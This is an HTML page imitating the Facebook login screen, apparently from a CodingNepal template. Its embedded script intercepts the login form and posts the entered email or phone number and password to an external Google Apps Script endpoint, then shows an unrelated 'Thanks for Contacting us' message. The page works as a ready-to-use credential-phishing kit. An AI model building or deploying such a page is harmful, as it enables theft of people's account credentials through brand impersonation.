<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="page.css">
    <link rel="icon" href="icon.png">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form  action="" method="post" name="google-sheet">
          <input type="text" name="email" placeholder="Email or phone number" required>
          <input type="password" name="password" placeholder="Password" required>
          <div class="link">
            <button type="submit" name="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwF8Ggp-m8XjhqF0RzU6hqsF274RsHIIE9CrnKdCK4v1B61zw2pmUx1duJpuU_5DFY2/exec'
        const form = document.forms['google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
            .catch(error => console.error('Error!', error.message))
        })
      </script>

</body>
</html>
